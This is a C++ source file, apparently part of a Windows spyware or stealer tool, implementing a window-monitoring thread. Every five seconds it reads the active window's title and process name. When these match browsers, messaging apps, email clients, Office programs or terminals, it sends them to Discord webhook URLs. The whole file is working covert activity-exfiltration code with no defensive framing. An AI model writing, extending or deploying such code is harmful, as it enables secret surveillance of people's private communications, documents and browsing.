#include "windowmonitor.h"
#include "discord.h"
#include "config.h"

#include <windows.h>
#include <string>
#include <sstream>
#include <thread>
#include <chrono>
#include <algorithm>

static std::wstring ObtenerTituloVentanaActiva() {
    HWND hWnd = GetForegroundWindow();
    if (!hWnd) return L"";
    int len = GetWindowTextLengthW(hWnd);
    if (len == 0) return L"";
    wchar_t buffer[512] = {0};
    GetWindowTextW(hWnd, buffer, 512);
    return std::wstring(buffer);
}

static std::wstring ObtenerProcesoVentanaActiva() {
    HWND hWnd = GetForegroundWindow();
    if (!hWnd) return L"";
    DWORD pid = 0;
    GetWindowThreadProcessId(hWnd, &pid);
    if (pid == 0) return L"";
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) return L"";
    wchar_t buf[MAX_PATH] = {0};
    DWORD size = MAX_PATH;
    std::wstring nombre;
    if (QueryFullProcessImageNameW(hProc, 0, buf, &size)) {
        std::wstring path(buf);
        size_t pos = path.find_last_of(L"\\");
        if (pos != std::wstring::npos) nombre = path.substr(pos + 1);
        else                            nombre = path;
    }
    CloseHandle(hProc);
    return nombre;
}

static std::wstring ToLower(const std::wstring& s) {
    std::wstring result = s;
    std::transform(result.begin(), result.end(), result.begin(), ::towlower);
    return result;
}

void HiloMonitorVentanas() {
    std::wstring ultimo_titulo;
    std::wstring ultimo_proceso;

    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(5));

        std::wstring titulo  = ObtenerTituloVentanaActiva();
        std::wstring proceso = ObtenerProcesoVentanaActiva();

        if (titulo.empty()) continue;
        if (titulo == ultimo_titulo && proceso == ultimo_proceso) continue;

        ultimo_titulo  = titulo;
        ultimo_proceso = proceso;

        std::wstring proc_lower = ToLower(proceso);
        bool interesante = false;
        const wchar_t* keywords[] = {
            L"chrome", L"msedge", L"firefox", L"brave", L"opera",
            L"discord", L"telegram", L"whatsapp",
            L"outlook", L"thunderbird",
            L"word", L"excel", L"powerpnt", L"notepad",
            L"cmd", L"powershell", L"windowsterminal"
        };
        for (auto kw : keywords) {
            if (proc_lower.find(kw) != std::wstring::npos) {
                interesante = true;
                break;
            }
        }
        if (!interesante) continue;

        std::wstringstream ss;
        ss << L"🌐 **Actividad detectada**\n"
           << L"📄 `" << titulo  << L"`\n"
           << L"⚙️ Proceso: `" << proceso << L"`";

        DiscordEnviarTexto(WEBHOOK_URLS, ss.str());
    }
}